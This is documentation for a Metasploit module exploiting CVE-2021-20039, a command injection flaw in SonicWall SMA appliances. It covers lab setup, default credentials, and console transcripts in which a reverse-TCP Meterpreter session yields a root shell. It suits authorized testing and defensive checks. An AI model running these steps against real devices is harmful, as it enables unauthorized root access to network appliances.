## Vulnerable Application

### Description

This module exploits an authenticated command injection vulnerability in the SonicWall
SMA 100 series web interface. Exploitation results in command execution as root. The
affected versions are:

* 10.2.1.2-24sv and below
* 10.2.0.8-37sv and below
* 9.0.0.11-31sv and below

### Installation

#### SonicWall SMA 500v 10.2.1.0-sv17 on VMWare Fusion

* Download 10.2.1.0-sv17 from: https://software.sonicwall.com/Firmware/sw_smavm_eng_10.2.1.0_10.2.1_p_17sv_1268045.ova
* From Fusion, import the downloaded ova.
* Start the VM.
* Log in to the command line interface using "admin" and "password".
* Hit "1" for "Setup Wizard".
* Configure the device with an appropriate address, gateway, and netmask (the device doesn't use DHCP).
* Done!

## Verification Steps

* Follow the above instructions to install SMA 500v
* Do: `use exploit/linux/http/sonicwall_cve_2021_20039`
* Do: `set RHOST <ip>`
* Do: `check`
* Verify the remote target is flagged as vulnerable
* Do: `set LHOST <ip>`
* Do: `exploit`
* You should get a Meterpreter session.

## Options

### USERNAME

The username to authenticate to the web server with. The default value is "admin".

### PASSWORD

The password to authenticate to the web server with. The default value is "password".

### PORTALNAME

The name of the SMA portal to authenticate to. The default value is "VirtualOffice".

### SWDOMAIN

The name of the domain to authenticate to. The default is "LocalDomain".

## Scenarios

### SMA 500v 10.2.1.1-19sv. Default creds. Get Meterpreter session.

```
msf6 > use exploit/linux/http/sonicwall_cve_2021_20039
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > set RHOST 10.0.0.7
RHOST => 10.0.0.7
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > check

[*] Version found: 10.2.1.1-19sv
[*] 10.0.0.7:443 - The target appears to be vulnerable. Based on the discovered version.
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > set LHOST 10.0.0.9
LHOST => 10.0.0.9
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > exploit

[*] Started reverse TCP handler on 10.0.0.9:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Version found: 10.2.1.1-19sv
[+] The target appears to be vulnerable. Based on the discovered version.
[*] Executing Linux Dropper for linux/x86/meterpreter/reverse_tcp
[*] Authentication successful
[*] Command Stager progress -   1.42% done (36/2533 bytes)
- truncated -
[*] Command Stager progress -  98.07% done (2484/2533 bytes)
[*] Sending stage (984904 bytes) to 10.0.0.7
[*] Meterpreter session 2 opened (10.0.0.9:4444 -> 10.0.0.7:58293 ) at 2021-11-17 10:56:30 -0800
[*] Command Stager progress -  99.37% done (2517/2533 bytes)
[*] Command Stager progress - 100.00% done (2533/2533 bytes)

meterpreter > getuid
Server username: root
meterpreter > shell
Process 6708 created.
Channel 1 created.
uname -a
Linux sslvpn 3.13.3 #1 SMP Mon Aug 9 11:13:43 GMT 2021 i686 i686 i386 GNU/Linux
id
uid=0(root) gid=99(nobody) groups=0(root),99(nobody)
```

### SMA 500v 9.0.0.10-28sv. Non-default creds. Get Meterpreter session.

```
msf6 > use exploit/linux/http/sonicwall_cve_2021_20039
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > set RHOST 10.0.0.6
RHOST => 10.0.0.6
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > check

[*] Version found: 9.0.0.10-28sv
[*] 10.0.0.6:443 - The target appears to be vulnerable. Based on the discovered version.
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > set LHOST 10.0.0.9
LHOST => 10.0.0.9
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > set PASSWORD labpass1
PASSWORD => labpass1
msf6 exploit(linux/http/sonicwall_cve_2021_20039) > exploit

[*] Started reverse TCP handler on 10.0.0.9:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Version found: 9.0.0.10-28sv
[+] The target appears to be vulnerable. Based on the discovered version.
[*] Executing Linux Dropper for linux/x86/meterpreter/reverse_tcp
[*] Authentication successful
[*] Command Stager progress -   1.42% done (36/2533 bytes)
- Truncated -
[*] Command Stager progress -  98.07% done (2484/2533 bytes)
[*] Sending stage (984904 bytes) to 10.0.0.6
[*] Meterpreter session 1 opened (10.0.0.9:4444 -> 10.0.0.6:38833 ) at 2021-11-17 11:00:29 -0800
[*] Command Stager progress -  99.37% done (2517/2533 bytes)
[*] Command Stager progress - 100.00% done (2533/2533 bytes)

meterpreter > getuid
Server username: root
meterpreter > shell
Process 24220 created.
Channel 1 created.
uname -a
Linux sslvpn 3.1.0 #1 SMP Thu Feb 18 15:44:36 GMT 2021 i686 i686 i386 GNU/Linux
id
uid=0(root) gid=99(nobody) groups=0(root),99(nobody)
```
